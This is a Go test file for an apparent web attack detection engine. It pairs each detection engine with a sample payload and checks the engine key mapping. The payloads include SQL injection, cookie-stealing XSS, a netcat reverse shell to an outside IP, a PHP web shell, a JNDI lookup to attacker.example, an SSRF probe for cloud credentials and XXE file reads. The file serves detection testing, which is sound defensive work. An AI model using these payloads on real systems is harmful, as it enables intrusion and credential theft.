package engine

import (
	"slices"
	"testing"
)

// engineProbes pairs every operator-switchable semantic engine with a payload
// that engine detects on its own under the production default config.
var engineProbes = []struct {
	key     string
	reason  string
	payload string
}{
	{"sql", ReasonSemanticSQL, "1' UNION SELECT password FROM users--"},
	{"xss", ReasonSemanticXSS, "<script>alert(document.cookie)</script>"},
	{"cmd", ReasonSemanticCMD, "`nc -e /bin/sh 1.2.3.4 4444`"},
	{"php", ReasonSemanticPHP, "<?php system($_GET['c']); ?>"},
	{"python", ReasonSemanticPython, "__import__('os').system('id')"},
	{"lfi", ReasonSemanticLFI, "../../../../etc/passwd"},
	{"ssrf", ReasonSemanticSSRF, "http://169.254.169.254/latest/meta-data/iam/security-credentials/"},
	{"java", ReasonSemanticJava, "${jndi:ldap://attacker.example/a}"},
	{"nosql", ReasonSemanticNoSQL, `{"username": {"$ne": null}, "password": {"$ne": null}}`},
	{"ssti", ReasonSemanticSSTI, "{{ config.__class__.__init__.__globals__['os'].popen('id').read() }}"},
	{"xxe", ReasonSemanticXXE, `<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>`},
	{"deser", ReasonSemanticDeser, `O:8:"Exploit":1:{s:4:"cmd";s:2:"id";}`},
	{"ldap", ReasonSemanticLDAP, "*)(uid=*))(|(uid=*"},
	{"proto_pollution", ReasonSemanticProtoPollution, `{"__proto__": {"isAdmin": true}}`},
}

func TestEngineSetKeys(t *testing.T) {
	var all EngineSet
	for _, p := range engineProbes {
		all |= EngineSetForKey(p.key)
	}
	want := make([]string, 0, len(engineProbes))
	for _, p := range engineProbes {
		want = append(want, p.key)
	}
	slices.Sort(want)
	got := all.Keys()
	slices.Sort(got)
	if !slices.Equal(got, want) {
		t.Fatalf("EngineSet keys %v, want %v", got, want)
	}
	if EngineSetForKey("anomaly") != 0 || EngineSetForKey("") != 0 {
		t.Fatal("keys outside the switchable engines must map to no bit")
	}
}
